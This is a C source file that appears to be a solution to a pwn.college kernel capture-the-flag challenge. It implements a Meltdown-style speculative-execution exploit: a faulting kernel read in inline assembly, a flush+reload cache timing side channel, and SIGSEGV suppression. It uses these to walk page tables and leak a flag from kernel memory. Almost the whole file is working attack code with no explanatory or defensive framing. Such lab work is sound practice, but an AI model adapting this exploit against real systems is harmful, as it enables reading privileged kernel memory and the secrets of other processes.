#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <setjmp.h>

#define CACHE_HIT_THRESHOLD 150
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 256


typedef struct query_arg
{
	unsigned long long int pid;
	unsigned long long int task_struct_addr;
} query_arg;

typedef struct touch_mem_arg
{
	unsigned long long int addr;
} touch_mem_arg;

char *buffer;


/*
 * victim code
 *
 */

char *secret_page;

/*
 * exploit code
 *
 */

void speculative_exploit(int fd, size_t target_addr, char *com_buffer) {
	ioctl(fd, 1337, target_addr);
	asm volatile(
			"xor rcx, rcx\n"
			"lea rbx, [%1]\n"
			"mov rax, 0x1337\n"
			"push rax\n"
			"fild QWORD PTR [rsp]\n"
			"fsqrt\n"
			"fistp QWORD PTR [rsp]\n"
			"pop rax\n"
			"mov rax, [rax]\n" // segfault
			"mov cl, BYTE PTR [%0]\n"
			"shl rcx, 12\n"
			"add rbx, rcx\n"
			"mov rbx, [rbx]\n"
			:
			: "r" (target_addr), "r" (com_buffer)
			: "rcx", "rbx", "rax"
		);
}

static jmp_buf buf;

static void segfault_handler(int signum) {
	(void)signum;
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
	longjmp(buf, 1);
}

void pre_work() {
	uint8_t *addr;
	for (int j = 0; j < BUFF_SIZE; j++) {
		addr = buffer + j * CACHE_LINE_SIZE;
		_mm_clflush(addr);
	}
}

uint64_t time_access_no_flush(void *p) {
	uint64_t start, end;
	start = __rdtsc();
	volatile uint64_t x = *(volatile uint64_t*)p;
	_mm_mfence();
	end = __rdtsc();
	return end - start;
}

bool post_work_inner_work(int mix_i) {
	uint8_t *addr;
	size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
	int index;
	uint64_t t_no_flush;
	index = mix_i * CACHE_LINE_SIZE;
	addr = buffer + index;
	t_no_flush = time_access_no_flush(addr);
	//printf("t_no_flush = %d ;", t_no_flush);
	if (t_no_flush < cache_hit_threshold) {
		return true;
	}
	return false;
}

int post_work(int *stats) {
	for (size_t i = 0; i < BUFF_SIZE; i++) {
		int mix_i = ((i * 167) + 13) & 255;
		if (post_work_inner_work(mix_i)) {
			stats[mix_i]++;
		}
	}
}

void *setup_mem() {
	return mmap(0, 255 * CACHE_LINE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
}

char *setup_secret() {
	char *page = mmap(0, 0x1000, PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	strcpy(page, "secret_message");
	printf("secret_val: %s\n", page);
	printf("secret_addr: %p\n", &page);
	return page;
}

int exploit(int fd, size_t addr) {
	int stats[255] = {0};

	for (int j = 0; j < 1000; j++) {
		if (!setjmp(buf)) {
			pre_work();
			speculative_exploit(fd, addr, buffer);
		}
		post_work(stats);
	}

	// Reviewing the stats data and print out the likely chars
	int max_index = 0;
	int max_value = 0;
	for (int j = 0; j < 256; j++) {
		//if (j > 20 && j < 127 && stats[j] > max_value) {
		if (stats[j] > max_value) {
			max_value = stats[j];
			max_index = j;
		}

	}

	//printf("value detected: %c\n", max_index);
	return max_index;
}

unsigned long long int read_addr_by_meltdown(int fd, unsigned long long int addr) {
	printf("addr to leak: %p\n", addr);
	unsigned long long int result = 0;
	for (int i = 0; i < 0x8; i++) {
		unsigned char tmp = exploit(fd, addr + i);
		//printf("%x\n", tmp);
		unsigned long long int shifted_tmp = (unsigned long long)tmp<<(8*i);
		//printf("shifted_tmp: %llx\n", shifted_tmp);
		result = shifted_tmp + result;
		printf("result: %llx\n", result);
	}
	return result;
}

int main(int argc, char **argv) {
	if (argc > 1) {
		if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
			printf("Failed to setup signal handler\n");
			exit(1);
		}
	}

	buffer = setup_mem();

	int pid = atoi(argv[1]);
	unsigned long long int task_struct_addr;
	struct query_arg *q = &(struct query_arg) {
		.pid = pid,
		.task_struct_addr = task_struct_addr
	};
	int fd = openat(AT_FDCWD, "/proc/pwncollege", O_RDWR);
	ioctl(fd, 31337, q);
	
	printf("task_struct_addr: %p\n", q->task_struct_addr);
	
	// unsigned long long int mm_addr = read_addr_by_meltdown(fd, q->task_struct_addr + 0x3e0);
	// printf("mm_struct: %p\n", mm_addr);
	
	// unsigned long long mm_addr = 0xffff88807d4df800;
	// unsigned long long int pgd_addr = read_addr_by_meltdown(fd, mm_addr + 0x50);
	// printf("pgd_addr: %p\n", pgd_addr);

	// unsigned long long int pgd_addr = 0xffff88807c7c6000;	
	// unsigned long long int pgd_val = read_addr_by_meltdown(fd, pgd_addr);
	// printf("pgd_val: %p\n", pgd_val);

	// unsigned long long int pgd_val = 0x7bc0e067 & 0xfffffffffffff000;
	// unsigned long long int pud_val = read_addr_by_meltdown(fd, 0xffff888000000000 + pgd_val);
	// printf("pud_val: %p\n", pud_val);

	// unsigned long long int pud_val = 0x7bc0f067 & 0xfffffffffffff000;
	// unsigned long long int pmd_val = read_addr_by_meltdown(fd, 0xffff888000000000 + pud_val + 0x10);
	// printf("pmd_val: %p\n", pmd_val);

	// unsigned long long int pmd_val = 0x7bc1a067  & 0xfffffffffffff000;
	// unsigned long long int pte_val = read_addr_by_meltdown(fd, 0xffff888000000000 + pmd_val + 0x20);
	// printf("pte_val: %p\n", pte_val);

	unsigned long long int pte_val = 0x10d8067 & 0xfffffffffffff000;
	unsigned long long int flag_addr = 0xffff888000000000 + pte_val + 0x60;
	printf("flag_addr: %p\n", flag_addr);



	// int flag_offset = 0x404060;

	for (int i = 0; i < 0xb; i++)
	{
		// exploit(secret_page + i);
		char tmp = exploit(fd, flag_addr + atoi(argv[2]) + i);
		printf("%c", tmp);
	}
	return 0;
}